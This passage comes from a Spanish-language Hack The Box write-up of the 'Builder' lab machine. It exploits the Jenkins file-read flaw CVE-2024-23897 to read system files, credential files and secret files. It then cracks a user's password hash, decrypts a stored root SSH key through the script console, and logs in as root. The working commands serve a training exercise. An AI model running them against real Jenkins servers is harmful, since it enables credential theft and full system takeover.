+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="965"
+    height="405"
+    src="/writeupps/htb-builder/image-1_hu_64513534057d020f.png"
+    srcset="/writeupps/htb-builder/image-1_hu_64513534057d020f.png 800w, /writeupps/htb-builder/image-1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-1.png"></figure>
+<p>Tambien se puede ver la sección de <em>Credentials</em> este nos muestra que se tiene una credencial guardada</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1097"
+    height="523"
+    src="/writeupps/htb-builder/image-3_hu_c8f7f706b7aef022.png"
+    srcset="/writeupps/htb-builder/image-3_hu_c8f7f706b7aef022.png 800w, /writeupps/htb-builder/image-3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-3.png"></figure>
+<p>La credencial hace referencia a una llave privada de &ldquo;root&rdquo;</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1005"
+    height="279"
+    src="/writeupps/htb-builder/image-4_hu_ff6466b650a6583b.png"
+    srcset="/writeupps/htb-builder/image-4_hu_ff6466b650a6583b.png 800w, /writeupps/htb-builder/image-4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-4.png"></figure>
+<p>Pero no se puede hacer mucho más que darnos una esperanza :)</p>
+<p>Vamos a verificar si se tiene un exploit para esta versión de Jenkins 2.441</p>
+
+<h2 class="relative group">Acceso Inicial
+    <div id="acceso-inicial" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#acceso-inicial" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Es en las búsquedas de google que nos encontramos con el CVE-2024-23897 el cual dentro de las versiones afectadas tenemos que calza con la versión que ejecuta la máquina objetivo</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="986"
+    height="249"
+    src="/writeupps/htb-builder/image-5_hu_671dbad9ed989c49.png"
+    srcset="/writeupps/htb-builder/image-5_hu_671dbad9ed989c49.png 800w, /writeupps/htb-builder/image-5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-5.png"></figure>
+<p>Esta vulnerabilidad dice lo siguiente:</p>
+<div class="admonition relative overflow-hidden rounded-lg border-l-4 my-3 px-4 py-3 shadow-sm" data-type="quote">
+      <div class="flex items-center gap-2 font-semibold text-inherit">
+        <div class="flex shrink-0 h-5 w-5 items-center justify-center text-lg"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+  <path fill="currentColor" d="M0 216C0 149.7 53.7 96 120 96h8c17.7 0 32 14.3 32 32s-14.3 32-32 32h-8c-30.9 0-56 25.1-56 56v8h64c35.3 0 64 28.7 64 64v64c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V216zm256 0c0-66.3 53.7-120 120-120h8c17.7 0 32 14.3 32 32s-14.3 32-32 32h-8c-30.9 0-56 25.1-56 56v8h64c35.3 0 64 28.7 64 64v64c0 35.3-28.7 64-64 64H320c-35.3 0-64-28.7-64-64V216z"/>
+</svg>
+</span></div>
+        <div class="grow">
+          Quote
+        </div>
+      </div><div class="admonition-content mt-3 text-base leading-relaxed text-inherit"><p>Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI command parser that replaces an &lsquo;@&rsquo; character followed by a file path in an argument with the file&rsquo;s contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system.</p></div></div><p>Básicamente esta vulnerabilidad nos permite leer archivos del sistema gracias a que el apartado CLI que dipone el Jenkins intenta procesar como archivo todo parámetro que comience por <em>@</em> y a partir de una función llamada <em>expandAtFiles</em> permite obtener el contenido de dicho archivo, lo podemos ver en el apartado de explotación.</p>
+<p>Como siempre, esto está automatizado dentro de muchos repos de github, sin embargo, vale la pena el intento de ejecución manual para aprender un poco más de donde viene la vulnerabilidad.</p>
+<p>El siguiente repositorio nos ofrece una vista más técnica para esta vulnerabilidad <a href="https://github.com/murataydemir/CVE-2024-23897"  target="_blank" rel="noreferrer">https://github.com/murataydemir/CVE-2024-23897</a></p>
+<p>Bien, la vulnerabilidad permite leer archivos a travéz de un CLI, pero de dónde se obtiene esto ? Ese &ldquo;CLI&rdquo; se obtiene por medio de la ruta http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar, la misma página de jenkins nos ofrece esa posibilidad en su documentación.</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="972"
+    height="98"
+    src="/writeupps/htb-builder/image-6_hu_e227bc76ab74f089.png"
+    srcset="/writeupps/htb-builder/image-6_hu_e227bc76ab74f089.png 800w, /writeupps/htb-builder/image-6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-6.png"></figure>
+<div class="admonition relative overflow-hidden rounded-lg border-l-4 my-3 px-4 py-3 shadow-sm" data-type="nota">
+      <div class="flex items-center gap-2 font-semibold text-inherit">
+        <div class="flex shrink-0 h-5 w-5 items-center justify-center text-lg"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+</span></div>
+        <div class="grow">
+          Nota
+        </div>
+      </div><div class="admonition-content mt-3 text-base leading-relaxed text-inherit"><p>Este CLI de Jenkins permite administrar la web a travéz de comandos de sistema o a través de una terminal, suele ser más beneficioso por el uso de recursos y otras cosas más.</p></div></div><p>Al digitar esa url se nos descargará un archivo llamado <em>jenkins-cli.jar</em>, es este archivo el que usaremos para interactuar con la web</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ who-am-i
+</span></span><span class="line"><span class="cl">Authenticated as: anonymous
+</span></span><span class="line"><span class="cl">Authorities:
+</span></span><span class="line"><span class="cl">  anonymous</span></span></code></pre></div></div>
+<p>Claramente necesitaríamos credenciales para realizar cambios administrativos, pero no tenemos ninguno :c, sin embargo, para explotar la vulnerabilidad no va a ser necesario una credencial válida</p>
+<p>Para verificar esta vulnerabilidad intentaremos digitar un comando con <code>jenkins-cli</code> y trataremos de enviar como parámetro una ruta de un archivo para que este lo procese</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/etc/passwd&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1202"
+    height="381"
+    src="/writeupps/htb-builder/image-7_hu_473d5d384b44b3f2.png"
+    srcset="/writeupps/htb-builder/image-7_hu_473d5d384b44b3f2.png 800w, /writeupps/htb-builder/image-7.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-7.png"></figure>
+<p>El archivo se lee y se toma como error tal como se ve en el resultado, esto nos permite colocar cualquier archivo y poder obtener su contenido, tal como se ve en el siguiente ejemplo</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/proc/self/environ&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1254"
+    height="117"
+    src="/writeupps/htb-builder/image-8_hu_3dc037bfe43725fb.png"
+    srcset="/writeupps/htb-builder/image-8_hu_3dc037bfe43725fb.png 800w, /writeupps/htb-builder/image-8.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-8.png"></figure>
+<p>Es a partir de estos &ldquo;errores&rdquo; que podemos ver los archivos, entonces vamos a verificar algunos archivos importantes del sistema</p>
+<p>Intentaremos ver los archivos de configuración del jenkins, para ver cómo obtenerlos basta con una búsqeuda en google o stack overflow</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="720"
+    height="372"
+    src="/writeupps/htb-builder/image-9.png"
+    srcset="/writeupps/htb-builder/image-9.png 800w, /writeupps/htb-builder/image-9.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-9.png"></figure>
+
+<a href="https://stackoverflow.com/questions/6131114/where-does-jenkins-store-configuration-files-for-the-jobs-it-runs"  target="_blank" rel="noreferrer">https://stackoverflow.com/questions/6131114/where-does-jenkins-store-configuration-files-for-the-jobs-it-runs</a></p>
+<p>En ella nos dicen que el archivo <em>config.xml</em> se encuentra en la carpeta raíz de instalación</p>
+<p>Bien&hellip;, pero donde está la carpeta de instalación ? eso lo podemos verificar en la carpetaa HOME del usuario jenkins dentro del archivo <em>/etc/passwd</em></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1004"
+    height="68"
+    src="/writeupps/htb-builder/image-10_hu_3a805eb8c66dc77e.png"
+    srcset="/writeupps/htb-builder/image-10_hu_3a805eb8c66dc77e.png 800w, /writeupps/htb-builder/image-10.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-10.png"></figure>
+<p>Entonces intentaremos obtener el contenido del archivo <em>/var/jenkins_home/config.xml</em></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/var/jenkins_home/config.xml&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1262"
+    height="845"
+    src="/writeupps/htb-builder/image-11_hu_ac05287f8d4ad673.png"
+    srcset="/writeupps/htb-builder/image-11_hu_ac05287f8d4ad673.png 800w, /writeupps/htb-builder/image-11.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-11.png"></figure>
+<p>Vemos que tenemos éxito al momento de obtener esa información</p>
+<p>Ahora, recordemos que vimos una sección de <em>Credentials</em> dentro de la web de Jenkins, esto tambien mantiene archivos que guardan esas credenciales, el archivo que los guarda tiene el nombre <em>credentials.xml</em>, esto se puede saber gracias a la discusión en Stackoverflow <a href="https://stackoverflow.com/questions/34795050/how-do-i-list-all-of-my-jenkins-credentials-in-the-script-console"  target="_blank" rel="noreferrer">https://stackoverflow.com/questions/34795050/how-do-i-list-all-of-my-jenkins-credentials-in-the-script-console</a></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/var/jenkins_home/credentials.xml&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="2528"
+    height="808"
+    src="/writeupps/htb-builder/image-12_hu_48311f5575a1688b.png"
+    srcset="/writeupps/htb-builder/image-12_hu_48311f5575a1688b.png 800w, /writeupps/htb-builder/image-12_hu_dc0d8cfb5798c2e.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-12.png"></figure>
+<p>En ese archivo podemos ver la llave privada de un usuario, pero este formato no nos favorece para utilizarlo como llave para acceder debido a que está encriptada, para ello usaremos el repositorio <a href="https://github.com/dadevel/jenkins-decryptor"  target="_blank" rel="noreferrer">https://github.com/dadevel/jenkins-decryptor</a>, en dicho repositorio nos dicen que debemos obbtener 3 archivos:</p>
+<ul>
+<li>$JENKINS_HOME/credentials.xml</li>
+<li>$JENKINS_HOME/secrets/hudson.util.Secret</li>
+<li>$JENKINS_HOME/secrets/master.key</li>
+</ul>
+<p>Para obtener estos archivos ejecutaremos lo siguiente:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/var/jenkins_home/credentials.xml&#34;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/: No such agent .*//&#39;</span> <span class="p">|</span> head -n -2</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="2534"
+    height="596"
+    src="/writeupps/htb-builder/image-13_hu_59454087b114d02e.png"
+    srcset="/writeupps/htb-builder/image-13_hu_59454087b114d02e.png 800w, /writeupps/htb-builder/image-13_hu_3ee64558a2f9e4da.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-13.png"></figure>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/var/jenkins_home/secrets/hudson.util.Secret&#34;</span></span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="2019"
+    height="94"
+    src="/writeupps/htb-builder/image-14_hu_25635c2001486865.png"
+    srcset="/writeupps/htb-builder/image-14_hu_25635c2001486865.png 800w, /writeupps/htb-builder/image-14_hu_d2df1524ba79c3c6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-14.png"></figure>
+<p>Acá nos topamos con algo, el contenido del archivo <em>hudson.util.Secret</em> no es posible replicarlo con un simple <strong>Ctrl + C</strong> por lo que intentaremos por otra vía</p>
+<p>Recordemos otra cosa, vimos a un usuario llamado <em>jennifer</em> entonces intentaremos obtener el archivo de configuración de los usuarios, este blog nos enseña dónde se podría encontrar dicha ruta <a href="https://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c"  target="_blank" rel="noreferrer">https://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c</a></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="920"
+    height="348"
+    src="/writeupps/htb-builder/image-15_hu_7dc15ff7762f054c.png"
+    srcset="/writeupps/htb-builder/image-15_hu_7dc15ff7762f054c.png 800w, /writeupps/htb-builder/image-15.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-15.png"></figure>
+<p>Pero, vemos que las carpetas con del tipo <em><usuario>-<random></em> así que no basta con solo ver la carpeta del usuario, tambien debemos conocer esa cadena de caracteres aleatorias, para esllo tenemos que en la carpeta <em>/users/</em> se encuentra un archivo llamado <em>users.xml</em></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node <span class="s2">&#34;@/var/jenkins_home/users/users.xml&#34;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/: No such agent .*//&#39;</span> <span class="p">|</span> head -n -2</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1325"
+    height="202"
+    src="/writeupps/htb-builder/image-16_hu_cb5205656538611a.png"
+    srcset="/writeupps/htb-builder/image-16_hu_cb5205656538611a.png 800w, /writeupps/htb-builder/image-16_hu_e9fb4af36e680075.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-16.png"></figure>
+<p>Vemos que encontramos la cadena de caracteres aleatorias que necesitamos para tener el nombre de la carpeta del usuario jennifer el cual es <em>jennifer_12108429903186576833</em>, pero cómo sabremos qué archivo buscar ? para ello veremos lo siguiente <a href="https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files"  target="_blank" rel="noreferrer">https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files</a></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="562"
+    height="105"
+    src="/writeupps/htb-builder/image-17.png"
+    srcset="/writeupps/htb-builder/image-17.png 800w, /writeupps/htb-builder/image-17.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-17.png"></figure>
+<p>Al parecer hay un archivo llamado <em>config.xml</em> dentro de cada carpeta del usuario</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node &#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#34; 2&gt;&amp;1 | sed &#39;s/: No such agent .*//&#39; | head -n -2</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1564"
+    height="1063"
+    src="/writeupps/htb-builder/image-18_hu_1c654f2805443a63.png"
+    srcset="/writeupps/htb-builder/image-18_hu_1c654f2805443a63.png 800w, /writeupps/htb-builder/image-18_hu_22d9e9e8324efe5c.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-18.png"></figure>
+<p>En las últimas líneas vemos que hay un hash el cual procederemos a crakear para obtener la contraseña</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="734"
+    height="185"
+    src="/writeupps/htb-builder/image-19.png"
+    srcset="/writeupps/htb-builder/image-19.png 800w, /writeupps/htb-builder/image-19.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-19.png"></figure>
+<p>Obtenemos la contraseña <em>princess</em>, utilziaremos el usuario jennifer para ingresar a Jenkins</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="559"
+    height="462"
+    src="/writeupps/htb-builder/image-20.png"
+    srcset="/writeupps/htb-builder/image-20.png 800w, /writeupps/htb-builder/image-20.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-20.png"></figure>
+
+<h2 class="relative group">Escalamiento de privilegios
+    <div id="escalamiento-de-privilegios" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#escalamiento-de-privilegios" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<p>Una vez dentro se intentará obtener la &ldquo;llave privada&rdquo; del root que no pudimos obtener en un primer intento para ello nos basaremos en el siguiente link <a href="https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml"  target="_blank" rel="noreferrer">https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml</a> el cual menciona que lo podemos hacer desde la ruta <em>/script</em> en el campo del script digitaremos lo siguiennte:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">println(hudson.util.Secret.decrypt(&#34;{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}&#34;))</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="658"
+    height="946"
+    src="/writeupps/htb-builder/image-21.png"
+    srcset="/writeupps/htb-builder/image-21.png 800w, /writeupps/htb-builder/image-21.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-21.png"></figure>
+<p>Con esto obtenemos la clave privada de root el cual se utilizará para ingresar al sistema con altos privilegios</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh root@10.129.230.220 -i id_rsa</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="564"
+    height="587"
+    src="/writeupps/htb-builder/image-22.png"
+    srcset="/writeupps/htb-builder/image-22.png 800w, /writeupps/htb-builder/image-22.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-22.png"></figure>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
